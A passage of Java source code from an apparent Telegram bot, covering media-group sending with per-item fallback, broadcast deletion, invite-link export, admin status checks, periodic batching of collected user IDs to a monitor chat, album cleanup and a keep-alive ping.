                        inputMedia.addProperty("parse_mode", "HTML");
                    }
                    
                } else {
                    // Skip unsupported media types
                    continue;
                }
                
                mediaArray.add(inputMedia);
            }
            
            if (mediaArray.size() > 0) {
                // Send media group
                JsonObject payload = new JsonObject();
                payload.addProperty("chat_id", chatId);
                payload.add("media", mediaArray);
                
                RequestBody body = RequestBody.create(
                    gson.toJson(payload),
                    MediaType.get("application/json; charset=utf-8")
                );
                
                Request request = new Request.Builder()
                    .url(BOT_API + "/sendMediaGroup")
                    .post(body)
                    .build();
                
                Response response = client.newCall(request).execute();
                String responseBody = response.body().string();
                JsonObject json = gson.fromJson(responseBody, JsonObject.class);
                
                if (json.get("ok").getAsBoolean()) {
                    JsonArray result = json.getAsJsonArray("result");
                    for (JsonElement elem : result) {
                        JsonObject msg = elem.getAsJsonObject();
                        long msgId = msg.get("message_id").getAsLong();
                        lastMessageIds.add(msgId);
                    }
                    System.out.println("✅ Sent media group with " + mediaArray.size() + " items");
                } else {
                    System.err.println("❌ Failed to send media group: " + responseBody);
                    // Fallback: send messages individually
                    sendMediaIndividually(chatId, mediaMessages, caption, lastMessageIds);
                }
            }
        } catch (Exception e) {
            System.err.println("Error sending media group: " + e.getMessage());
            e.printStackTrace();
            // Fallback: send messages individually
            sendMediaIndividually(chatId, mediaMessages, caption, lastMessageIds);
        }
    }

    private static void sendMediaIndividually(long chatId, List<JsonObject> mediaMessages, String caption, List<Long> lastMessageIds) {
        System.out.println("Using fallback: sending media individually");
        
        for (int i = 0; i < mediaMessages.size(); i++) {
            try {
                JsonObject mediaMessage = mediaMessages.get(i);
                
                if (mediaMessage.has("photo")) {
                    JsonArray photos = mediaMessage.getAsJsonArray("photo");
                    JsonObject photo = photos.get(photos.size() - 1).getAsJsonObject();
                    String fileId = photo.get("file_id").getAsString();
                    
                    JsonObject payload = new JsonObject();
                    payload.addProperty("chat_id", chatId);
                    payload.addProperty("photo", fileId);
                    
                    // Add caption only to first photo if available
                    if (i == 0 && caption != null && !caption.isEmpty()) {
                        payload.addProperty("caption", caption);
                        payload.addProperty("parse_mode", "HTML");
                    }
                    
                    RequestBody body = RequestBody.create(
                        gson.toJson(payload),
                        MediaType.get("application/json; charset=utf-8")
                    );
                    
                    Request request = new Request.Builder()
                        .url(BOT_API + "/sendPhoto")
                        .post(body)
                        .build();
                    
                    Response response = client.newCall(request).execute();
                    String responseBody = response.body().string();
                    JsonObject json = gson.fromJson(responseBody, JsonObject.class);
                    
                    if (json.get("ok").getAsBoolean()) {
                        long msgId = json.getAsJsonObject("result").get("message_id").getAsLong();
                        lastMessageIds.add(msgId);
                    }
                    
                } else if (mediaMessage.has("video")) {
                    JsonObject video = mediaMessage.getAsJsonObject("video");
                    String fileId = video.get("file_id").getAsString();
                    
                    JsonObject payload = new JsonObject();
                    payload.addProperty("chat_id", chatId);
                    payload.addProperty("video", fileId);
                    
                    // Add caption only to first video if available
                    if (i == 0 && caption != null && !caption.isEmpty()) {
                        payload.addProperty("caption", caption);
                        payload.addProperty("parse_mode", "HTML");
                    }
                    
                    RequestBody body = RequestBody.create(
                        gson.toJson(payload),
                        MediaType.get("application/json; charset=utf-8")
                    );
                    
                    Request request = new Request.Builder()
                        .url(BOT_API + "/sendVideo")
                        .post(body)
                        .build();
                    
                    Response response = client.newCall(request).execute();
                    String responseBody = response.body().string();
                    JsonObject json = gson.fromJson(responseBody, JsonObject.class);
                    
                    if (json.get("ok").getAsBoolean()) {
                        long msgId = json.getAsJsonObject("result").get("message_id").getAsLong();
                        lastMessageIds.add(msgId);
                    }
                }
                
                // Small delay between messages
                if (i < mediaMessages.size() - 1) {
                    Thread.sleep(100);
                }
            } catch (Exception e) {
                System.err.println("Error sending individual media: " + e.getMessage());
            }
        }
    }

    private static int deleteLastBroadcast() {
        int deletedCount = 0;
        for (Map.Entry<Long, Long> entry : lastBroadcastIds.entrySet()) {
            if (deleteMessageWithDelay(entry.getKey(), entry.getValue())) {
                deletedCount++;
            }
        }
        lastBroadcastIds.clear();
        return deletedCount;
    }

    private static String exportInviteLink(long chatId) {
        try {
            Request request = new Request.Builder()
                .url(BOT_API + "/exportChatInviteLink?chat_id=" + chatId)
                .build();
            
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
            
            if (json.get("ok").getAsBoolean()) {
                return json.get("result").getAsString();
            }
        } catch (IOException e) {
            System.err.println("Error exporting invite link: " + e.getMessage());
        }
        return null;
    }

    private static String checkBotStatus(long chatId) {
        try {
            Request request = new Request.Builder()
                .url(BOT_API + "/getChat?chat_id=" + chatId)
                .build();
            
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
            
            if (!json.get("ok").getAsBoolean()) {
                return "❌ Bot is not in this chat or chat doesn't exist";
            }
            
            // Check if bot is admin
            List<Long> admins = getChatAdministrators(chatId);
            long botId = getMe().getAsJsonObject("result").get("id").getAsLong();
            
            if (admins.contains(botId)) {
                return "✅ Bot is active and admin in this chat";
            } else {
                return "⚠️ Bot is in chat but not admin";
            }
            
        } catch (Exception e) {
            return "❌ Error checking status: " + e.getMessage();
        }
    }

    private static JsonObject getMe() {
        try {
            Request request = new Request.Builder()
                .url(BOT_API + "/getMe")
                .build();
            
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            return gson.fromJson(responseBody, JsonObject.class);
        } catch (IOException e) {
            System.err.println("Error getting bot info: " + e.getMessage());
            return new JsonObject();
        }
    }

    private static String getChatTitle(long chatId) {
        try {
            Request request = new Request.Builder()
                .url(BOT_API + "/getChat?chat_id=" + chatId)
                .build();
            
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
            
            if (json.get("ok").getAsBoolean()) {
                JsonObject chat = json.getAsJsonObject("result");
                if (chat.has("title")) {
                    return chat.get("title").getAsString();
                } else if (chat.has("first_name")) {
                    return chat.get("first_name").getAsString();
                }
            }
        } catch (IOException e) {
            System.err.println("Error getting chat title: " + e.getMessage());
        }
        return "Unknown Group";
    }

    private static void flushUserBatch() {
        if (collectedUsers.isEmpty()) return;
        
        List<Long> batch = new ArrayList<>(collectedUsers);
        collectedUsers.clear();
        
        StringBuilder message = new StringBuilder();
        message.append("📊 Collected Users (").append(batch.size()).append("):\n\n");
        
        for (Long userId : batch) {
            message.append(userId).append("\n");
            if (message.length() > 3000) {
                sendMessage(MONITOR_ID, message.toString(), null, null, null);
                message = new StringBuilder();
            }
        }
        
        if (message.length() > 0) {
            sendMessage(MONITOR_ID, message.toString(), null, null, null);
        }
    }

    private static void sendUserBatch() {
        while (true) {
            try {
                Thread.sleep(TimeUnit.MINUTES.toMillis(10));
                flushUserBatch();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private static void cleanupOldAlbums() {
        while (true) {
            try {
                Thread.sleep(TimeUnit.MINUTES.toMillis(5));
                
                long now = System.currentTimeMillis();
                List<String> toRemove = new ArrayList<>();
                
                for (Map.Entry<String, Map<String, Object>> entry : mediaGroups.entrySet()) {
                    long lastUpdate = (long) entry.getValue().get("last_update");
                    if (now - lastUpdate > TimeUnit.MINUTES.toMillis(10)) {
                        toRemove.add(entry.getKey());
                    }
                }
                
                for (String key : toRemove) {
                    mediaGroups.remove(key);
                }
                
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private static void keepAlive() {
        while (true) {
            try {
                // Ping own health endpoint
                Request request = new Request.Builder()
                    .url(WEBHOOK_URL + "/health")
                    .build();
                
                client.newCall(request).execute();
                System.out.println("Keep-alive ping sent at " + new Date());
                
            } catch (Exception e) {
                System.err.println("Keep-alive failed: " + e.getMessage());
            }
            
            try {
                Thread.sleep(TimeUnit.MINUTES.toMillis(2));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}